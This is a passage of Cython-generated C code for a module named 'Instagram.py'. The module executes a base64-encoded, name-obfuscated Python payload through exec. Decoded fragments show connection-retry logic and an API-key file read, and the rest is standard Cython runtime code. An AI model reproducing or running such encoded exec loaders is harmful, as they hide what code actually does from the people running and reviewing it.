ME99JykjbGluZTo3NDQKICAgICAgICBlbHNlIDojbGluZTo3NDUKICAgICAgICAgIE9PME8wME9PMDBPMDAwT08wIC5sb29waW5nICs9MSAjbGluZTo3NDYKICAgIGV4Y2VwdCAoQ29ubmVjdGlvbkVycm9yICk6I2xpbmU6NzQ3CiAgICAgIHByaW50IChmIntQfVt7VX0he1B9XXtVfSBLb25la3NpIEVycm9yICAgICAgICAgICAgICAgIixlbmQgPSdccicpO3RpbWUgLnNsZWVwICg4ICk7T08wTzAwT08wME8wMDBPTzAgLl9fbWFpbl9fIChPT08wME8wME8wT08wMDBPTyAsTzBPMDBPT08wTzBPT09PMDAgLE8wTzBPT08wMDAwME8wMDBPICkjbGluZTo3NDgKICAgIGV4Y2VwdCA6T08wTzAwT08wME8wMDBPTzAgLl9fbWFpbl9fIChPT08wME8wME8wT08wMDBPTyAsTzBPMDBPT08wTzBPT09PMDAgLE8wTzBPT08wMDAwME8wMDBPICkjbGluZTo3NDkKZGVmIF9fbWFzdWtfXyAoKTojbGluZTo3NTEKICB0cnkgOiNsaW5lOjc1MgogICAgTzBPT09PMDAwME9PME8wTzAgPW9wZW4gKCdEYXRhL2FwaWtleS50eHQnLCdyJykucmVhZCAoKSNsaW5lOjc1MwogIGV4Y2VwdCAoSU9FcnJvciApOiNsaW5lOjc1NAogICAgX19hcGlrZXlfXyAoKSNsaW5lOjc1NQogIGVsc2UgOiNsaW5lOjc1NgogICAgX19tZW51X18gKCkjbGluZTE1Nw=='))
 */
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_base64, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "Instagram.py":2
 * import base64
 * exec(base64.b64decode(b''))             # <<<<<<<<<<<<<<
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_base64); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_b64decode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_Globals(); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyExec3(__pyx_t_1, __pyx_t_2, 0);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "Instagram.py":1
 * import base64             # <<<<<<<<<<<<<<
 * exec(base64.b64decode(b''))
 */
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_3) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init Instagram", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init Instagram");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_NCP_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) goto bad;
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char *code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    } else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
                     Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
        #if PY_MAJOR_VERSION >= 3
        } else if (!PyBytes_Check(o)) {
        #else
        } else if (!PyString_Check(o)) {
        #endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
        #if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
        #else
        code = PyString_AS_STRING(o);
        #endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}

/* GetAttr */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* CIntToPy */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
